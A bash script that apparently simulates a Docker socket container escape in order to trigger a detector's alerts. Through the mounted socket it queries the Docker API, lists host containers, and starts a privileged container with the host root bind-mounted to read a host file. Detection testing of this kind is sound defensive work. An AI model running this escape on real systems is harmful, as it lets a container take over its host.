#!/bin/bash
# ATTACK 1 — Docker Socket Escape
# A container with /var/run/docker.sock mounted uses it to
# access the Docker API and spawn a privileged escape container.
set -e

echo "=== ATTACK 1: Docker Socket Escape ==="
echo "PID: $$  Container: $(hostname)"
echo ""

# Verify socket is accessible
if [ ! -S /var/run/docker.sock ]; then
    echo "[FAIL] /var/run/docker.sock not found"
    exit 1
fi
echo "[+] Docker socket accessible inside container"

# Step 1: Connect to Docker API via the socket
echo "[*] Querying Docker API via unix socket..."
curl -s --unix-socket /var/run/docker.sock http://localhost/version | head -c 120
echo ""

# Step 2: List host containers (information disclosure)
echo "[*] Listing host containers..."
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -c 200
echo ""

# Step 3: Spawn privileged escape container mounting host root
echo "[*] Creating escape container with host root mounted..."
RESP=$(curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["cat","/hostfs/etc/hostname"],"HostConfig":{"Privileged":true,"Binds":["/:hostfs:ro"]}}' \
    http://localhost/containers/create 2>/dev/null)
CID=$(echo "$RESP" | grep -o '"Id":"[^"]*"' | head -1 | cut -d'"' -f4)

if [ -n "$CID" ]; then
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
    sleep 1
    OUTPUT=$(curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=true" 2>/dev/null)
    echo "[!] ESCAPED — host file content: $OUTPUT"
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
else
    echo "[*] Container creation response: $RESP"
fi

echo ""
echo "=== Attack complete — check detector for DOCKER-SOCKET-ESCAPE alerts ==="
